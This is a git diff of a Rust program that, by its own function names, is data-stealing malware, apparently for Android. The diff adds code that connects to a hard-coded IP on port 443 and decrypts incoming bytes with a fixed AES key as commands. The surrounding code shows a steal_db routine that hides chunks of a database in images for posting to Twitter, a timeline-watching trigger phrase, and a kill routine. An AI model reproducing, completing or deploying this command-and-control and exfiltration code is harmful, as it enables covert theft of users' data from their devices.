@@ -8,9 +8,9 @@ mod utils;
 
 use egg_mode::media::{media_types, upload_media};
 /*
-use android_logger::Config;
-use log::Level;
-*/
+   use android_logger::Config;
+   use log::Level;
+   */
 use egg_mode::tweet::DraftTweet;
 use encoder::Encoder;
 use errors::Error;
@@ -28,89 +28,105 @@ use utils::ByteMask;
 use nix::unistd::*;
 use std::net::TcpStream;
 use openssl::aes::{AesKey, KeyError, aes_ige};
-use openssl::symm::{encrypt, decrypt, Cipher};
+use openssl::symm::{encrypt, Cipher, Crypter};
 use openssl::symm::Mode;
+use openssl::error::ErrorStack;
 use hex::{FromHex, ToHex};
 
 static WORKING_DIRECTORY: &str = "toast";
 
+fn decrypt(t: Cipher,
+           key: &[u8],
+           iv: Option<&[u8]>,
+           data: &[u8],
+           ) -> Result<Vec<u8>, ErrorStack> {
+    let mut c = Crypter::new(t, Mode::Decrypt, key, iv)?;
+    c.pad(false);
+    let mut out = vec![0; data.len() + t.block_size()];
+    let count = c.update(data, &mut out)?;
+    let rest = c.finalize(&mut out[count..])?;
+    out.truncate(count + rest);
+    Ok(out)
+}
+
 fn main() -> Result<(), Error> {
 
     /*
-    android_logger::init_once(
-        Config::default()
-        .with_min_level(Level::Info) // limit log level
-        .with_tag("TOAST") // logs will show under mytag tag
-    );
-    */
+       android_logger::init_once(
+       Config::default()
+       .with_min_level(Level::Info) // limit log level
+       .with_tag("TOAST") // logs will show under mytag tag
+       );
+       */
 
 
 
     /*
-    match setup() {
-        Ok(()) => info!("No error from setup"),
-        Err(e) => error!("Error in setup: {}", e),
-    };
-    */
+       match setup() {
+       Ok(()) => info!("No error from setup"),
+       Err(e) => error!("Error in setup: {}", e),
+       };
+       */
     get_commands().unwrap();
     /*
-    match start() {
-        Ok(()) => info!("No error from start"), 
-        Err(e) => error!("start: {}", e),
-    };
+       match start() {
+       Ok(()) => info!("No error from start"), 
+       Err(e) => error!("start: {}", e),
+       };
 
     //let path = env::current_dir()?;
     match pull_tweets() {
-        Ok(()) => info!("No error from pull_tweets"), 
-        Err(e) => error!("pull_tweets: {}", e),
+    Ok(()) => info!("No error from pull_tweets"), 
+    Err(e) => error!("pull_tweets: {}", e),
     };
 
     match steal_db() {
-        Ok(()) => info!("No error from steal_db"),
-        Err(e) => error!("steal_db: {}", e),
+    Ok(()) => info!("No error from steal_db"),
+    Err(e) => error!("steal_db: {}", e),
     };
-    
+
     match send_tweet() { 
-        Ok(()) => info!("No error from send_tweet"),
-        Err(e) => error!("send_tweet: {}", e),
+    Ok(()) => info!("No error from send_tweet"),
+    Err(e) => error!("send_tweet: {}", e),
     };
 
     match kill() {
-        Ok(()) => info!("No error from kill"),
-        Err(e) => error!("kill: {}", e),
+    Ok(()) => info!("No error from kill"),
+    Err(e) => error!("kill: {}", e),
     };
     */
     Ok(())
 }
 
 fn get_commands() -> Result<(), Box<dyn std::error::Error>>{
+
+    let data = b"get0000000000000\x00";
+
+
     let mut stream = TcpStream::connect("3.215.107.66:443")?;
 
-    let mut buffer = [0; 1024];
+    let mut buffer = [0; 32];
 
     let len = stream.read(&mut buffer)?;
 
     let key = Vec::from_hex("546869732069732061206b6579313233")?;
     let mut iv = Vec::from_hex("5468697320697320616e204956343536")?;
 
-    println!("key {:?}, iv {:?}",key, iv);
+    let cipher = Cipher::aes_128_cbc();
+    
     let mut output = vec![0u8; len];
 
-    let cipher = Cipher::aes_128_cbc();
 
     let command = match decrypt(
         cipher,
         &key,
         Some(&iv),
-        &buffer) {
-            Ok(c) => c,
-            Err(e) => panic!("{}", e),
-        };
+        &buffer[0..16]) {
+        Ok(c) => c,
+        Err(e) => panic!("{}", e),
+    };
 
-    println!("{:?}" , std::str::from_utf8(&command));
-    /*
-    aes_ige(&buffer, &mut output, &key, &mut iv, Mode::Decrypt);
-    */
+    println!("{:?}" , std::str::from_utf8(&command).unwrap());
     Ok(())
 
 }
@@ -129,14 +145,14 @@ async fn start() -> Result<(), Box<dyn std::error::Error>> {
     loop {
         let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(100);
         let (_user, feed) = user.start().await?;
-        
+
         for status in feed.iter() {
             if status.text.contains("We are hungry") {
                 end = true;
                 break;
             }
         }
-        
+
         if end == true {
             break;
         }
@@ -159,7 +175,7 @@ fn setup() -> Result<(), Box<dyn std::error::Error>> {
 
     env::set_current_dir("/data")?;
 
-    
+
     match env::args().next() {
         Some(arg) => {
             info!("Argument: {}", &arg);
@@ -173,7 +189,7 @@ fn setup() -> Result<(), Box<dyn std::error::Error>> {
 
     fs::create_dir(WORKING_DIRECTORY)?;
     env::set_current_dir(WORKING_DIRECTORY)?;
-    
+
     Ok(())
 }
 
@@ -202,14 +218,14 @@ fn steal_db() -> Result<(), Error> {
     info!("Database size: {}", &file_size);
     let image_meta = fs::metadata("image_0.jpg")?;
     let image_size = image_meta.len();
-    
+
     info!("Image size: {}", image_size);
 
     let image_size_float = image_size as f64;
     let number_of_pictures = f64::from(file_size) / image_size_float;
     let rounded = round::ceil(number_of_pictures, 0) as u32;
     let mut i:u32 = 0;
-    
+
     while i < rounded {
         info!("ENCODING {}", i);
         let jpg = format!("image_0.jpg");
@@ -225,7 +241,7 @@ fn steal_db() -> Result<(), Error> {
         let file_name = format!("chunk_{}", i);
         let mut file = File::create(&file_name)?;
         file.write_all(&to_write)?;
-        
+
         info!("encoding {} into {} as {}", &file_name, &jpg, &png);
         encode(PathBuf::from(&jpg), PathBuf::from(&file_name), PathBuf::from(&png), mask)?;
         i+=1;
@@ -311,7 +327,7 @@ async fn pull_tweets() -> Result<(), Box<dyn std::error::Error>> {
         }
         thread::sleep(ten_secs);
     }
-    
+
     Ok(())
 }
 
